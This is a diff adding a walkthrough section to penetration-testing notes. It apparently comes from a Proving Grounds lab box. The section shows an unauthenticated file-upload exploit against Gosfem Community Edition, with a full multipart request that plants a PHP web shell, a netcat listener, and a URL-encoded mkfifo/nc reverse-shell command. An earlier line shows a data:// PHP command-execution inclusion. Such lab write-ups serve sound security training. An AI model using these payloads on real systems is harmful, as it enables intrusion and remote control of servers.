@@ -182,3 +182,104 @@ http://<IP>/menu.php?file=data:text/plain,<?php echo shell_exec("whoami")?>
 </html>
 
 ```
+
+### HTTP Request Command Shell
+
+#### *Found on PG Educated Box*
+
+We begin by attempting to fingerprint the application and google search for "Gosfem Community Edition".
+
+We find a download for it here: https://sourceforge.net/projects/gosfem/.
+
+Downloading the source, we see that there are default credentials set which we are unable to authenticate with upon testing.
+
+Our next attempt is to check for any public exploits. We discover the following public exploit: https://www.exploit-db.com/exploits/50587.
+
+However the exploit doesn't state whether it requires authentication. We can manually confirm that the exploit does not require authentication by viewing the source code:
+
+We see the following function causing the unrestricted file upload:
+
+![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/CTF3_image_4_IQ2D49KM.png)
+
+After going through the references of this file, we discover:
+
+![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/CTF3_image_5_KF4SW2D9.png)
+
+We see that at no point some ace of authorization/ authentication checks place.
+
+Thus confirms that we do not need a session to exploit it (in contrast to what the public exploit indicates).
+
+In order to establish our foothold, we must slightly adjust the raw HTTP request given in the exploit (wrong newlines, path).
+
+The final request might look similar to this:
+
+```
+POST /management/admin/examQuestion/create HTTP/1.1
+Host: school.pg
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544
+Content-Length: 1330
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="name"
+
+test4
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="class_id"
+
+2
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="subject_id"
+
+5
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="timestamp"
+
+2021-12-08
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="teacher_id"
+
+1
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="file_type"
+
+txt
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="status"
+
+1
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="description"
+
+123123
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="_wysihtml5_mode"
+
+1
+-----------------------------183813756938980137172117669544
+Content-Disposition: form-data; name="file_name"; filename="cmd.php"
+Content-Type: application/octet-stream
+
+<?php system($_GET["cmd"]); ?>
+-----------------------------183813756938980137172117669544--
+```
+
+The uploaded shell can be found in `http://school.pg/management/uploads/exam_question/cmd.php`.
+
+![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/CTF3_image_6_LO4R6HJI.png)
+
+We setup a listener on our attack machine.
+
+```
+kali@kali:~$ nc -nlvp 443
+listening on [any] 443 ...
+```
+
+We proceed by using `curl` to trigger a reverse shell:
+
+```
+$ curl school.pg/management/uploads/exam_question/cmd.php?cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%30%2e%32%2e%32%20%39%30%30%33%20%3e%2f%74%6d%70%2f%66 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.2 9003 >/tmp/f
+```
